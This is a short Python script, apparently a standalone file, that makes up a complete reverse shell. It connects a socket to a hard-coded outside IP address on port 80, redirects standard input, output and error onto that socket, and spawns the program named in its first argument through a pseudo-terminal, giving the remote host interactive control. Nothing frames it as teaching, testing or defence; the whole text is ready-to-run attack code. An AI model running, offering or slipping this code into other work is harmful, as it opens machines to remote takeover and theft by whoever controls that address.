import sys
import socket
import os
import pty

s=socket.socket()
s.connect(('34.151.230.32', 80))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(sys.argv[1])
